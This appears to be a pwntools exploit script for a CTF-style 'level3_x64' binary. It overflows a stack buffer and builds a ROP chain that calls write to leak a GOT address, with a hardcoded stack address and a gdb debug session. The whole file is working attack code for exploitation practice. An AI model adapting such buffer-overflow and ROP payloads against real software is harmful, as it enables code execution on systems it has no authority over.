from pwn import *
context.log_level = 'debug'
elf = ELF('level3_x64')
#io = process('level3_x64')
io = gdb.debug('./level3_x64','break vulnerable_function')
padding = 0x80

payload1 = b'A'*(padding+0x8)+p64(0x00000000004006b3)+p64(0x1)+p64(0x00000000004006b1)+p64(elf.got['write'])+p64(0x1)+p64(0x00000000004006AA)

payload1 += p64(0x0)+p64(0x1)+p64(0x7ffd4725c788)+p64(0x8)+p64(elf.got['write'])+p64(0x1)+p64(0x0000000000400690)+p64(0xdeadbeef)*7+p64(elf.got['write'])
io.sendlineafter(b'Input:\n',payload1)
io.interactive()
